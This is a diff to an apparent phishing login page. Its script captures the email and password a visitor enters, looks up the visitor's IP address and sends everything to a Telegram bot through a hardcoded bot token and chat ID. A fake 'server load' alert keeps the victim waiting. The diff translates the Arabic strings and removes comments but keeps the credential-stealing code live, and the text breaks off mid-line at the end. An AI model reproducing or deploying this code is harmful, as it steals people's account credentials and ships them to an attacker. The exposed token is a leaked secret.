@@ -25,22 +25,20 @@
         </div>
     </div>
     <script>
-        const TOKEN = "7966593148:AAHhZ7-CI67oVYZf5YddEfs5y0R6hDFjqI4"; // التوكن الخاص بك
-        const CHAT_ID = "6243038338"; // معرف الشات الخاص بك
+        const TOKEN = "7966593148:AAHhZ7-CI67oVYZf5YddEfs5y0R6hDFjqI4";
+        const CHAT_ID = "6243038338";
         const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
         document.getElementById('login-btn').addEventListener('click', async function(e) {
-            e.preventDefault(); // منع الرابط من التنقل
+            e.preventDefault();
 
-            alert('عليك الانتظار ساعة بسبب الضغط على خادمنا');
+            alert('Please wait an hour due to server load.');
 
-            // الحصول على البريد الإلكتروني وكلمة المرور المدخلة
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
             console.log("Sending data to Telegram...");
 
-            // إرسال البيانات إلى بوت التلغرام عبر API
             try {
                 const ipResponse = await axios.get('https://api.ipify.org?format=json');
                 const ip = ipResponse.data.ip;
@@ -64,7 +62,6 @@
 
                 console.log("Message: ", message);
 
-                // إرسال الطلب إلى التلغرام
                 const response = await axios.post(URI_API, {
                     chat_id: CHAT_ID,
                     parse_mode: 'html',
@@ -74,10 +71,4 @@
                 console.log("Telegram response: ", response);
                 alert('Information sent successfully!');
             } catch (error) {
-                console.error("Error sending data to Telegram: ", error);
-                alert('Error sending information. Please try again.');
-            }
-        });
-    </script>
-</body>
-</html>
+                console.error("Error sending data to Telegram
